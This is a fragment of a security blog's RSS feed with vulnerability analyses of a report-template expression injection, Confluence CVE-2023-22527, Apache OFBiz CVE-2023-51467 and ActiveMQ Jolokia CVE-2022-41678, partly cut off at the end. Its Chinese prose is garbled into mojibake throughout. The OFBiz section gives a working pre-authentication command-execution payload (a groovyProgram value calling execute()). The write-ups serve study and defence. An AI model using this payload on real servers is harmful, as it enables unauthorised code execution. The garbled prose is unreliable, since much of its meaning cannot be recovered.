&lt;p&gt;æ¥ä¸‹æ¥ä¼šå»è°ƒç”¨ä¸‹ä¸€ä¸ª&lt;code&gt;eval&lt;/code&gt; ï¼Œè¿™é‡Œå°±æ˜¯å‰é¢è¡¨è¾¾å¼çš„&lt;code&gt;eval&lt;/code&gt; ï¼Œå®é™…è°ƒç”¨çš„æ˜¯&lt;code&gt;RelationExpression&lt;/code&gt; çˆ¶ç±»&lt;code&gt;BinaryExpression&lt;/code&gt; çš„&lt;code&gt;eval&lt;/code&gt; ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./%E6%9F%90%E6%8A%A5%E8%A1%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20240724002636625.png&quot; alt=&quot;image-20240724002636625&quot; /&gt;&lt;/p&gt;
&lt;p&gt;ç„¶åå°±æ˜¯æ˜¯è°ƒç”¨ä¸‹ä¸€ä¸ª&lt;code&gt;Node&lt;/code&gt; çš„&lt;code&gt;eval&lt;/code&gt;æ–¹æ³•ï¼Œè¿™é‡Œçš„&lt;code&gt;eval&lt;/code&gt;æ˜¯ä½¿ç”¨ç´¢å¼•è¿›è¡Œæ£€æµ‹çš„ï¼Œå®é™…æ˜¯è·å–è¡¨è¾¾å¼&lt;code&gt;=&lt;/code&gt; å³è¾¹çš„å†…å®¹ï¼Œå¦‚æœæ˜¯å‡½æ•°çš„è¯å°±æ˜¯&lt;code&gt;FunctionCall&lt;/code&gt;ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./%E6%9F%90%E6%8A%A5%E8%A1%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20240724002924552.png&quot; alt=&quot;image-20240724002924552&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;FunctionCall.eval&lt;/code&gt;æ–¹æ³•ä¼šå»è°ƒç”¨&lt;code&gt;resolveMethod&lt;/code&gt;ï¼Œè¿™ä¹Ÿæ˜¯è¿™ä¸ªæ¼æ´çš„å…³é”®ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./%E6%9F%90%E6%8A%A5%E8%A1%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20240724003555779.png&quot; alt=&quot;image-20240724003555779&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;resolveMethod&lt;/code&gt; æœ€ç»ˆä¼šè·å–ä¸€ä¸ªå‘½åç©ºé—´ç„¶åè°ƒç”¨&lt;code&gt;getMethod&lt;/code&gt; ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./%E6%9F%90%E6%8A%A5%E8%A1%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20240724003707923.png&quot; alt=&quot;image-20240724003707923&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./%E6%9F%90%E6%8A%A5%E8%A1%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20240724003842295.png&quot; alt=&quot;image-20240724003842295&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./%E6%9F%90%E6%8A%A5%E8%A1%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20240724003943915.png&quot; alt=&quot;image-20240724003943915&quot; /&gt;&lt;/p&gt;
&lt;p&gt;åˆ°äº†å‡½æ•°è°ƒç”¨ï¼Œä¹Ÿå°±æ˜¯æ¼æ´å‘ç”Ÿçš„åœ°æ–¹ï¼Œå­˜åœ¨&lt;code&gt;getMethod&lt;/code&gt; ç›¸å…³çš„å®ç°ç±»ä¸­&lt;code&gt;DefaultNameSpace&lt;/code&gt; ç±»çš„&lt;code&gt;getMethod&lt;/code&gt; è¿™é‡Œé€šè¿‡ä¼ å…¥çš„å†…å®¹å»åŠ è½½ç±»ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./%E6%9F%90%E6%8A%A5%E8%A1%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20240724004715865.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;å®é™…ä¼šå»è°ƒç”¨&lt;code&gt;com.fr.function.xxx&lt;/code&gt;,è¿™ä¸ªåŒ…é‡Œé¢æœ‰å¾ˆå¤šå‡½æ•°å¯ä»¥è°ƒï¼Œè¿”å›åå»è°ƒç”¨&lt;code&gt;evalExpression&lt;/code&gt; ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./%E6%9F%90%E6%8A%A5%E8%A1%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20240724005229688.png&quot; alt=&quot;image-20240724005229688&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./%E6%9F%90%E6%8A%A5%E8%A1%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20240724005158851.png&quot; alt=&quot;image-20240724005158851&quot; /&gt;&lt;/p&gt;
&lt;p&gt;ç½‘ä¼ ä¸º&lt;code&gt;SQL&lt;/code&gt;ï¼Œçœ‹ä¸‹&lt;code&gt;SQL&lt;/code&gt; ç±»ï¼Œåº”è¯¥ä¸ç”¨å¤šè¯´äº†å§ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./%E6%9F%90%E6%8A%A5%E8%A1%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20240724005341582.png&quot; alt=&quot;image-20240724005341582&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./%E6%9F%90%E6%8A%A5%E8%A1%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20240724005009251.png&quot; alt=&quot;image-20240724005009251&quot; /&gt;&lt;/p&gt;
&lt;p&gt;è‡³äºå…¥å£ï¼š&lt;img src=&quot;./%E6%9F%90%E6%8A%A5%E8%A1%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20240724013008799.png&quot; alt=&quot;image-20240724013008799&quot; /&gt;&lt;/p&gt;
&lt;p&gt;å…¶å®å¯ç©æ€§è¿˜æ˜¯æŒºé«˜çš„ï¼Œä¹Ÿä¸ä¸€å®šéè¦ç”¨SQLçš„å½¢å¼å»åšPOCæ¥æ£€æµ‹ã€‚&lt;/p&gt;
&lt;p&gt;ç°å·²åŠ å…¥è±ªåæ£€æµ‹å¥—é¤ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./%E6%9F%90%E6%8A%A5%E8%A1%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/_cgi-bin_mmwebwx-bin_webwxgetmsgimg__&amp;amp;MsgID=3531227235581003473&amp;amp;skey=@crypt_b66086c6_d8eb79eaffcfe4864f2fea67418cc0b0&amp;amp;mmweb_appid=wx_webfilehelper.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
</content:encoded></item><item><title>(CVE-2023-22527)Atlassian Confluence - Remote Code Execution</title><link>https://www.springkill.club/posts/cve-2023-22527-atlassian-confluence-remote-code-execution/</link><guid isPermaLink="true">https://www.springkill.club/posts/cve-2023-22527-atlassian-confluence-remote-code-execution/</guid><pubDate>Tue, 23 Jan 2024 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;æ¼æ´æè¿°&lt;/h2&gt;
&lt;p&gt;Atlassian Confluence å­˜åœ¨æ¨¡æ¿æ³¨å…¥ä»£ç æ‰§è¡Œæ¼æ´ï¼Œæ”»å‡»è€…å¯æ„é€ æ¶æ„è¯·æ±‚è§¦å‘æ¨¡æ¿æ³¨å…¥è¿›è€Œé€ æˆè¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚&lt;/p&gt;
&lt;h2&gt;å½±å“ç‰ˆæœ¬&lt;/h2&gt;
&lt;p&gt;åœæ­¢æ›´æ–°çš„å„ä¸ªç‰ˆæœ¬ä»¥åŠï¼š
8.4.0 &amp;lt;= Confluence Data Center and Server &amp;lt;= 8.4.4
8.5.0 &amp;lt;= Confluence Data Center and Server &amp;lt;= 8.5.3
8.6.0 &amp;lt;= Confluence Data Center &amp;lt;= 8.6.1&lt;/p&gt;
&lt;h2&gt;æ¼æ´åˆ†æ&lt;/h2&gt;
&lt;p&gt;è¿˜æ˜¯è€æ ·å­ï¼Œdiffä¸€ä¸‹ä»£ç å‘ç°confluenceçš„ä¸€äº›ä¿®æ”¹ï¼Œæœ‰ä¸€ä¸ªåˆ é™¤äº†çš„æ–‡ä»¶å¼•èµ·æ³¨æ„ï¼š
&lt;img src=&quot;./CVE-2023-22527-Atlassian-Confluence-Remote-Code-Execution/image-20240123001830674.png&quot; alt=&quot;&quot; /&gt;
åˆ é™¤äº†ï¼š
&lt;img src=&quot;./CVE-2023-22527-Atlassian-Confluence-Remote-Code-Execution/image-20240123001835407.png&quot; alt=&quot;&quot; /&gt;
ConfluenceStrutsUtilç»§æ‰¿è‡ªVelocityStrutsUtilï¼š
&lt;img src=&quot;./CVE-2023-22527-Atlassian-Confluence-Remote-Code-Execution/image-20240123001841567.png&quot; alt=&quot;&quot; /&gt;
VelocityStrutsUtilåˆç»§æ‰¿è‡ªStrutsUtilï¼Œçœ‹åˆ°è¿™é‡Œæ¨æµ‹velocityæ¨¡æ¿æ³¨å…¥ã€‚
å…·ä½“åº”è¯¥å’Œå‰å‡ æ¬¡æœ‰å‡ åˆ†ç›¸ä¼¼ï¼Œvelocityè§£æå¯¼è‡´çš„&lt;code&gt;ognl&lt;/code&gt;è¡¨è¾¾å¼æ‰§è¡Œï¼Œäºæ˜¯å¯ä»¥å»çœ‹vmæ–‡ä»¶ã€‚
å†çœ‹vmæ–‡ä»¶çš„æ—¶å€™ï¼ŒçŠ¯äº†ä¸€ä¸ªå¾ˆå¤§çš„é”™è¯¯ï¼Œæˆ‘åœ¨é‡ç½®å¯†ç è¿™é‡Œçœ‹äº†å¥½ä¹…ï¼Œä½†æ˜¯å§‹ç»ˆæ˜¯æ²¡æœ‰ç»“æœï¼Œå®ƒæ˜¯ä»actioné‡Œé¢è¯»å–çš„å˜é‡ï¼Œæ‰€ä»¥åº”è¯¥ä¸å­˜åœ¨æ¼æ´äº†ï¼Œé€šè¿‡vmæ–‡ä»¶è¿›è¡Œè®¿é—®çš„æ—¶å€™å¹¶ä¸èƒ½è®¾ç½®è¿™ä¸ªå€¼ã€‚
&lt;img src=&quot;./CVE-2023-22527-Atlassian-Confluence-Remote-Code-Execution/image-20240123001846042.png&quot; alt=&quot;&quot; /&gt;
åˆæ­£å€¼å¹´ç»ˆæ€»ç»“æ­£å¥½å¾ˆå¿™ï¼Œäºæ˜¯å°±æš‚ä¸”æç½®ã€‚
åæ¥å‘ç°GitHubä¸Šå¤šäº†ä¸€ä¸ªé¡¹ç›®&lt;a href=&quot;https://github.com/Sudistark/patch-diff-CVE-2023-22527&quot;&gt;https://github.com/Sudistark/patch-diff-CVE-2023-22527&lt;/a&gt;ï¼Œé‡Œé¢æœ‰æ‰€æœ‰vmçš„ä¿¡æ¯ï¼Œäºæ˜¯å°±æ˜¯ç›´æ¥æœä¸€ä¸‹ï¼š
&lt;img src=&quot;./CVE-2023-22527-Atlassian-Confluence-Remote-Code-Execution/image-20240123001849425.png&quot; alt=&quot;&quot; /&gt;
äºæ˜¯æˆ‘å°è¯•ä¸€äº›å…¶ä»–æ¥å£ï¼Œä½†æ˜¯éƒ½æ˜¯ä¸€æ— æ‰€è·ï¼Œè¿™æœŸé—´æƒ³è®©Z3æ•™æˆ‘ï¼Œå¾—åˆ°çš„å›å¤æ˜¯ï¼š
&lt;img src=&quot;./CVE-2023-22527-Atlassian-Confluence-Remote-Code-Execution/image-20240123002426058.png&quot; alt=&quot;&quot; /&gt;
æœ€ååœ¨&lt;code&gt;text-inline.vm&lt;/code&gt;ä¸­ä¼šè°ƒç”¨åˆ°findvalueæ–¹æ³•ä»è€Œé€ æˆè¡¨è¾¾å¼çš„æ‰§è¡Œï¼š
&lt;img src=&quot;./CVE-2023-22527-Atlassian-Confluence-Remote-Code-Execution/image-20240123001855784.png&quot; alt=&quot;&quot; /&gt;
è¯•ä¸€ä¸‹ç»å…¸pocï¼š
&lt;img src=&quot;./CVE-2023-22527-Atlassian-Confluence-Remote-Code-Execution/image-20240123001859143.png&quot; alt=&quot;&quot; /&gt;
åœ¨StrutsUtilé‡Œé¢æœç„¶æ˜¯æ‰¾åˆ°äº†è¿™ä¸ªå†…å®¹ï¼Œå¤ªé•¿äº†åˆ†å¼€æˆªï¼š
&lt;img src=&quot;./CVE-2023-22527-Atlassian-Confluence-Remote-Code-Execution/image-20240123001903997.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;./CVE-2023-22527-Atlassian-Confluence-Remote-Code-Execution/image-20240123001922941.png&quot; alt=&quot;&quot; /&gt;
åé¢å°±ä¼šæŒ‰ç…§æ¨¡æ¿å®šä¹‰çš„èµ°åˆ°&lt;code&gt;findvalue&lt;/code&gt;ï¼š
&lt;img src=&quot;./CVE-2023-22527-Atlassian-Confluence-Remote-Code-Execution/image-20240123001946487.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;./CVE-2023-22527-Atlassian-Confluence-Remote-Code-Execution/image-20240123001953026.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;./CVE-2023-22527-Atlassian-Confluence-Remote-Code-Execution/image-20240123002000159.png&quot; alt=&quot;&quot; /&gt;
åˆ°è¿™é‡Œå°±æ‰§è¡Œäº†ï¼š
&lt;img src=&quot;./CVE-2023-22527-Atlassian-Confluence-Remote-Code-Execution/image-20240123002018309.png&quot; alt=&quot;&quot; /&gt;
ç„¶åé€šè¿‡getTextæ–¹æ³•å–å€¼ï¼Œè¿™é‡Œå‘ç°å·²ç»è®¡ç®—å®Œæ¯•äº†ï¼š
&lt;img src=&quot;./CVE-2023-22527-Atlassian-Confluence-Remote-Code-Execution/image-20240123002022472.png&quot; alt=&quot;&quot; /&gt;
é‚£ä¹ˆè¿™ä¹Ÿå°±é€šè¿‡velocityé€ æˆäº†Ognlè¡¨è¾¾å¼æ‰§è¡Œæ¼æ´ã€‚&lt;/p&gt;
&lt;h2&gt;å…³äºRCE&lt;/h2&gt;
&lt;p&gt;è¿™å—å¯æ˜¯ç„¦å¤´çƒ‚é¢ï¼Œå°è¯•æ„é€ äº†å‡ ä¸ªéƒ½æ²¡æˆåŠŸæ‰§è¡Œå‘½ä»¤ï¼ˆå¼¹è®¡ç®—å™¨ï¼‰ï¼Œç›´åˆ°ä»Šå¤©çœ‹åˆ°Pç‰›çš„vulhubæ›´æ–°äº†ï¼Œæ‰æƒ³èµ·ç”¨å›æ˜¾ï¼Œè¿™é‡Œæ”¾ä¸‹vulhubé“¾æ¥ï¼Œå°±ä¸ç…§æŠ„äº†ã€‚
&lt;a href=&quot;https://github.com/vulhub/vulhub/tree/master/confluence/CVE-2023-22527&quot;&gt;https://github.com/vulhub/vulhub/tree/master/confluence/CVE-2023-22527&lt;/a&gt;
&lt;img src=&quot;./CVE-2023-22527-Atlassian-Confluence-Remote-Code-Execution/image-20240123002026504.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
</content:encoded></item><item><title>CVE-2023-51467 Apache OFBiz: Pre-authentication Remote Code Execution (RCE) vulnerability</title><link>https://www.springkill.club/posts/cve-2023-51467--apache-ofbiz_-pre-authentication-remote-code-execution-rce-vulnerability/</link><guid isPermaLink="true">https://www.springkill.club/posts/cve-2023-51467--apache-ofbiz_-pre-authentication-remote-code-execution-rce-vulnerability/</guid><pubDate>Sat, 30 Dec 2023 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;æ¼æ´æè¿°&lt;/h2&gt;
&lt;p&gt;å› ä¸ºå‰é¢çˆ†å‡ºçš„OFBizæ¼æ´ä¸­çš„æƒé™ç»•è¿‡å¹¶æ²¡æœ‰è¢«ä¿®å¤ï¼Œæ‰€ä»¥å¯¼è‡´äº†è¿™æ¬¡çš„æ¼æ´ï¼Œé€šè¿‡å¤–éƒ¨è°ƒç”¨groovyå¹¶ä¸”ç»•è¿‡é»‘åå•è¾¾åˆ°RCEã€‚&lt;/p&gt;
&lt;h2&gt;æ¼æ´åˆ†æ&lt;/h2&gt;
&lt;p&gt;æ¼æ´çš„ä½ç½®å¾ˆç®€å•ä¹Ÿå¾ˆæ˜äº†ï¼š
![](./CVE-2023-51467  Apache OFBiz_ Pre-authentication Remote Code Execution (RCE) vulnerability/1703677648017-9c965b63-048d-4fcd-84b9-3483ba12e5f6.png)
å…³é”®å°±æ˜¯æˆ‘ä»¬å¦‚ä½•æ‰¾åˆ°ä¸€ä¸ªå…¥å£ï¼Œä¼ å…¥è¿™ä¸ªexpressionå‘¢ï¼Œé‚£ä¹ˆæ°å¥½åå°æœ‰è¿™ä¹ˆä¸ªåŠŸèƒ½å¯ä»¥è¿›è¡Œè¡¨è¾¾å¼çš„ä¼ å…¥ï¼š
![image.png](./CVE-2023-51467  Apache OFBiz_ Pre-authentication Remote Code Execution (RCE) vulnerability/1703860971243-0a974dea-3881-4e2c-92ad-4456215d3727.png)
æŸ¥çœ‹controller.xmlå¯ä»¥çŸ¥é“ï¼Œè¿™é‡Œçš„ç±»å‹æ˜¯ä¸€ä¸ªè§†å›¾ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥å»çœ‹è§†å›¾çš„é…ç½®ï¼š
![image.png](./CVE-2023-51467  Apache OFBiz_ Pre-authentication Remote Code Execution (RCE) vulnerability/1703861056964-b99df67d-ba47-4dd6-ad11-118e8558f8ef.png)
å®šä½åˆ°è¿™ä¹ˆä¸€ä¸ªæ–‡ä»¶ï¼Œå»çœ‹ä¸€ä¸‹é‡Œé¢çš„è¯¦ç»†ä¿¡æ¯ï¼Œæ¥å—å€¼çš„å†…å®¹å¦‚ä¸‹ï¼Œåé¢å°±æ˜¯è°ƒç”¨shellæ‰§è¡Œgroovyäº†ï¼Œå°±ä¸æˆªå›¾äº†ï¼š
![image.png](./CVE-2023-51467  Apache OFBiz_ Pre-authentication Remote Code Execution (RCE) vulnerability/1703861146878-be5b83b6-6c3b-4c36-b5a7-e4b67b6ee6b5.png)
æœ€åçš„æ‰§è¡Œæ•ˆæœå¦‚ä¸‹ï¼š
![image.png](./CVE-2023-51467  Apache OFBiz_ Pre-authentication Remote Code Execution (RCE) vulnerability/1703782220217-31942f51-a016-4532-908e-0263a7d1d344.png)
å…¶å®å‘ç°è¿™ä¸ªæ¼æ´æœ€å¼€å§‹å¹¶ä¸æ˜¯é…ç½®æ–‡ä»¶æ¥çš„ï¼Œwebç•Œé¢ä¸­æœ‰ä¸ªåŠŸèƒ½å°±å«&lt;code&gt;å¯ç¼–ç¨‹å¯¼å‡º&lt;/code&gt;ï¼Œå°±æ˜¯è¿™ä¸ªurlï¼ŒåŒæ—¶å‚æ•°ä¹Ÿæ˜¯è¿™ä¸ªå‚æ•°ï¼Œé€šè¿‡æ²¡æœ‰ä¿®å¤çš„é‰´æƒæ¥ç»•è¿‡ç™»å½•ç›´æ¥å»æ‰§è¡Œå‘½ä»¤ã€‚
ä¼ å…¥çš„å€¼ä¸ºï¼š&lt;code&gt;groovyProgram=println+%22calc%22.execute%28%29.text&lt;/code&gt;ï¼Œå¹¶æ²¡æœ‰ä»€ä¹ˆç‰¹æ®Šçš„æŠ€æœ¯å«é‡ï¼Œåªæ˜¯æ‰§è¡Œäº†executeè€Œå·²ã€‚&lt;/p&gt;
</content:encoded></item><item><title>CVE-2022-41678 Apache ActiveMQ Jolokia RCE</title><link>https://www.springkill.club/posts/cve-2022-41678-apache-activemq-jolokia-rce/</link><guid isPermaLink="true">https://www.springkill.club/posts/cve-2022-41678-apache-activemq-jolokia-rce/</guid><pubDate>Fri, 01 Dec 2023 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;ActiveMQçš„æ¼æ´æœ€è¿‘ä¹Ÿæœ‰å‡ ä¸ªï¼Œä½†æ˜¯å› ä¸ºæˆ‘å·²ç»çœ‹åˆ°æœ‰å¸ˆå‚…åˆ†æäº†è‡ªå·±ä¹Ÿå°±æ²¡ç»†çœ‹ï¼Œæƒ³ç€åé¢å­¦ä¸€ä¸‹æ€è·¯ï¼Œä½†æ˜¯åæ¥å°±å¿˜äº†è¿™æ¡£å­äº‹äº†ï¼Œæ­£å¥½æ˜¨å¤©åˆå…¬å¸ƒäº†è¿™ä¸ªå»å¹´çš„è€æ´ï¼Œå°±ä¸€å£æ°”éƒ½å†™ä¸€ä¸ªå­¦ä¹ ç¬”è®°ç½¢äº†ã€‚ï¼ˆä¸»è¦æ˜¯activemqè¿™ä¸ªäº§å“å¹¶æ²¡æœ‰æ•´ä½“å­¦ä¸€éï¼Œæ­£å¥½ä¹Ÿç®€å•å­¦ä¸€å­¦ã€‚
æ­¤å¤–ï¼Œå¯¹äºæ¼æ´å®˜æ–¹çš„ç»†èŠ‚éå¸¸è¯¦å°½ï¼Œè¯·çœ‹&lt;a href=&quot;https://activemq.apache.org/security-advisories.data/CVE-2022-41678-announcement.txt&quot;&gt;è¿™é‡Œ&lt;/a&gt;ã€‚&lt;/p&gt;
&lt;h2&gt;å½±å“ç‰ˆæœ¬&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;Apache ActiveMQ&lt;/code&gt; &amp;lt; 5.16.6
5.17.0 &amp;lt; &lt;code&gt;Apache ActiveMQ&lt;/code&gt; &amp;lt; 5.17.4&lt;/p&gt;
&lt;h2&gt;å‰ç½®çŸ¥è¯†&lt;/h2&gt;
&lt;p&gt;åœ¨&lt;code&gt;Apache ActiveMQ&lt;/code&gt;ä¸­ä½¿ç”¨&lt;code&gt;Jolokia API&lt;/code&gt;æ—¶ï¼Œå®¢æˆ·ç«¯å‘é€çš„&lt;code&gt;JSON&lt;/code&gt;è¯·æ±‚æ ¼å¼ä¾èµ–äºä½ æƒ³æ‰§è¡Œçš„å…·ä½“æ“ä½œã€‚&lt;code&gt;Jolokia&lt;/code&gt;æ”¯æŒå¤šç§æ“ä½œï¼ŒåŒ…æ‹¬è¯»å–&lt;code&gt;MBean&lt;/code&gt;å±æ€§ã€æ‰§è¡Œ&lt;code&gt;MBean&lt;/code&gt;æ“ä½œã€å†™å…¥&lt;code&gt;MBean&lt;/code&gt;å±æ€§ç­‰ã€‚
ä¸‹é¢ä»‹ç»&lt;code&gt;jolokia&lt;/code&gt;ä¸­çš„ä¸€äº›åŸºæœ¬æ“ä½œã€‚&lt;/p&gt;
&lt;h3&gt;è¯»å– MBean å±æ€§&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;{
  &quot;type&quot;: &quot;read&quot;,
  &quot;mbean&quot;: &quot;org.apache.activemq:type=Broker,brokerName=localhost&quot;,
  &quot;attribute&quot;: &quot;TotalProducerCount&quot;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;![image-20231201003335267](./CVE-2022-41678 Apache ActiveMQ Jolokia RCE/image-20231201003335267.png)&lt;/p&gt;
&lt;h3&gt;æ‰§è¡Œ MBean æ“ä½œ&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;{
  &quot;type&quot;: &quot;exec&quot;,
  &quot;mbean&quot;: &quot;org.apache.activemq:type=Broker,brokerName=localhost&quot;,
  &quot;operation&quot;: &quot;addQueue&quot;,
  &quot;arguments&quot;: [&quot;TestQueue&quot;]
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;![image-20231201003342466](./CVE-2022-41678 Apache ActiveMQ Jolokia RCE/image-20231201003342466.png)&lt;/p&gt;
&lt;h3&gt;å†™å…¥ MBean å±æ€§&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;{
  &quot;type&quot;: &quot;write&quot;,
  &quot;mbean&quot;: &quot;org.apache.activemq:type=Broker,brokerName=localhost&quot;,
  &quot;attribute&quot;: &quot;SomeAttribute&quot;,
  &quot;value&quot;: &quot;NewValue&quot;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;![image-20231201003345836](./CVE-2022-41678 Apache ActiveMQ Jolokia RCE/image-20231201003345836.png)&lt;/p&gt;
&lt;h3&gt;è·å–æ‰€æœ‰ MBeans çš„åˆ—è¡¨&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;{
  &quot;type&quot;: &quot;list&quot;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;![image-20231201003348573](./CVE-2022-41678 Apache ActiveMQ Jolokia RCE/image-20231201003348573.png)
å¥½äº†æœ‰äº†ä»¥ä¸Šå†…å®¹å°±è¶³å¤Ÿæˆ‘ä»¬åˆ†ææœ¬æ¬¡æ¼æ´äº†ã€‚&lt;/p&gt;
&lt;h2&gt;æ¼æ´åˆ†æ&lt;/h2&gt;
&lt;p&gt;é˜¿é‡Œäº‘çš„æƒ…æŠ¥éƒ½è¯´äº†æ˜¯&lt;code&gt;Jolokia&lt;/code&gt;å‡ºçš„æ¼æ´ï¼Œè‡ªç„¶ä¹Ÿå°±ç›´æ¥diffçœ‹ä¸€ä¸‹ä¿®å¤ï¼ˆçœŸä¸æ˜¯å› ä¸ºæˆ‘æ‡’
è¿™é‡Œå°±ä¸å¾—ä¸è¯´åƒä¸‡åˆ«ä¸‹5.17ï¼Œç›´æ¥ç”¨5.16ç›¸å…³ç‰ˆæœ¬ï¼Œç¯å¢ƒå¤§å‘ï¼Œæˆ‘å¼„äº†å¾ˆä¹…ã€‚
![image-20231201003358698](./CVE-2022-41678 Apache ActiveMQ Jolokia RCE/image-20231201003358698.png)
é¦–å…ˆé€šè¿‡&lt;code&gt;web.xml&lt;/code&gt;å®šä½åˆ°&lt;code&gt;jolokia&lt;/code&gt;çš„è·¯å¾„å’Œå…¶ä½¿ç”¨çš„&lt;code&gt;servlet&lt;/code&gt;ã€‚
å…ˆåˆ†æä¸€ä¸‹&lt;code&gt;org.jolokia.http.AgentServlet&lt;/code&gt;ä¸­çš„å†…å®¹ï¼š
![image-20231201003403085](./CVE-2022-41678 Apache ActiveMQ Jolokia RCE/image-20231201003403085.png)
![image-20231201003406901](./CVE-2022-41678 Apache ActiveMQ Jolokia RCE/image-20231201003406901.png)
è¿™é‡Œåˆ¤æ–­äº†å¦‚æœä½ çš„&lt;code&gt;Origin&lt;/code&gt;ä¸ç¬¦åˆæ¡ä»¶ï¼Œé‚£ä¹ˆå°±ç›´æ¥é€€å‡ºï¼Œæ‰€ä»¥è®¿é—®çš„æ—¶å€™åŠ ä¸Š&lt;code&gt;Origin&lt;/code&gt;å¤´ã€‚
åŠ ä¸Šå¤´ä¹‹åå°±èƒ½æˆåŠŸè®¿é—®è¿™äº›ä¸œè¥¿äº†ï¼Œä¹Ÿå°±æ˜¯å‰é¢å‰ç½®çŸ¥è¯†é‡Œé‚£æ ·ã€‚
é€šè¿‡äº†è§£å‰ç½®çŸ¥è¯†æˆ‘ä»¬çŸ¥é“äº†ï¼Œé€šè¿‡&lt;code&gt;Jolikia&lt;/code&gt;å¯ä»¥å¯¹&lt;code&gt;MBean&lt;/code&gt;è¿›è¡Œæ“ä½œï¼Œ&lt;code&gt;MBean&lt;/code&gt;æ—¶&lt;code&gt;JMX&lt;/code&gt;ä¸­çš„æ ¸å¿ƒéƒ¨åˆ†ï¼Œé€šè¿‡&lt;code&gt;MBean&lt;/code&gt;å¯ä»¥å°†JDKçº§åˆ«çš„æœåŠ¡ä»¥æ¥å£çš„æ–¹å¼å¯¹å¤–æš´éœ²ï¼Œæä¾›å¾ˆå¤šåŠŸèƒ½ã€‚
åœ¨&lt;code&gt;Java11&lt;/code&gt;ä¸­ï¼Œæ–°å¢äº†ä¸€ä¸ª&lt;code&gt;MBean&lt;/code&gt;ï¼š&lt;code&gt;jdk.management.jfr.FlightRecorderMXBeanImpl&lt;/code&gt;
å¯¹äºè¿™ä¸ª&lt;code&gt;MBean&lt;/code&gt;å®˜æ–¹ä¹Ÿæœ‰è¯¦ç»†çš„ä»‹ç»ï¼Œæƒ³çœ‹çš„å¸ˆå‚…å¯ä»¥ç§»æ­¥&lt;a href=&quot;https://docs.oracle.com/en/java/javase/11/docs/api/jdk.management.jfr/jdk/management/jfr/FlightRecorderMXBean.html&quot;&gt;FlightRecorderMXBean (Java SE 11 &amp;amp; JDK 11 )&lt;/a&gt;ï¼Œæˆ‘åœ¨è¿™é‡Œå°±ç®€å•ä»‹ç»ä¸€ä¸‹ã€‚
newRecordingæ–¹æ³•ç”¨æ¥åˆ›å»ºä¸€ä¸ªæ–°çš„è®°å½•ï¼Œä½†æ˜¯å¹¶ä¸ä¼šå¯åŠ¨å®ƒï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;public long newRecording() {
	MBeanUtils.checkControl();
	getRecorder(); // ensure notification listener is setup
	return AccessController.doPrivileged(new PrivilegedAction&amp;lt;Recording&amp;gt;() {
		@Override
		public Recording run() {
			return new Recording();
		}
	}, null, new FlightRecorderPermission(&quot;accessFlightRecorder&quot;)).getId();
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;åˆ›å»ºä¸€ä¸ªå½•åˆ¶åå¹¶ä¸ä¼šå¼€å§‹ï¼Œè¦é€šè¿‡&lt;code&gt;startRecording&lt;/code&gt;æ–¹æ³•æ¥å¯åŠ¨è¿™ä¸ªå½•åˆ¶ï¼Œå…¶ä¸­æ¥å—çš„å‚æ•°å°±æ˜¯å‰é¢è¿”å›çš„å‚æ•°ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;public void startRecording(long id) {
	MBeanUtils.checkControl();
	getExistingRecording(id).start();
}
&lt;/code&gt;&lt;/pre&gt;
